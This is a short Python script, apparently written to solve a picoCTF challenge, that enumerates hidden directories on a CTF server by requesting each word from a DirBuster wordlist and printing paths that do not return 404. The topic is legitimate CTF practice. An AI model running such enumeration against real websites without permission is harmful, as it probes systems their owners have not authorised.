import requests
wordlist = open("C:/Program Files (x86)/DirBuster/directory-list-lowercase-2.3-medium.txt").read().split("\n")
url = "http://saturn.picoctf.net:50167/secret/assets"

from multiprocessing import Pool

def do(word):
    r = requests.get(url + "/" + word)
    #print("starting", word)
    if(r.status_code != 404):
        print(word)
    
i = 0
for word in wordlist:
    do(word)
    if i % 200 == 0:
        print(i)
    i+=1

    
    
